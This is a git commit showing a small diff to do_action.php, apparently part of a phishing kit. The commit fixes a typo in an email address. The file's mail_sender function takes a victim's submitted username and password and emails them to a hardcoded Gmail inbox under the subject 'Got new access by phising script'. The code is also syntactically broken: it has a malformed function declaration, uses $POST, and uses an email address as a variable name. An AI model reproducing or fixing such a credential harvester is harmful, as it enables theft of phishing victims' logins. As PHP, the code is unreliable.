8d45e602821350520fa9c14e254f90916b329a28
vmchems2204-gmail <65176952+vmchems2204-gmail@users.noreply.github.com>
2020-05-11 20:35:53 +0530

    Update do_action.php

--- do_action.php
+++ do_action.php
@@ -1,12 +1,12 @@
 <?php
 	mail_sender(){
-		$username = $POST['vmthalapthy2204@gmail.com'];
+		$username = $POST['vmthalapathy2204@gmail.com'];
 		$password = $POST['password'];
 		
 		$reciever = "vmchems2204@gmail.com";
 		
 		$subject = "Got new access by phising script";
-		$message = "The username is ". $vmthalapthy2204@gmail.com;
+		$message = "The username is ". $vmthalapathy2204@gmail.com;
 		$message .= "and password is ". $password;
 		
 		return mail($reciever, $subject, $message);
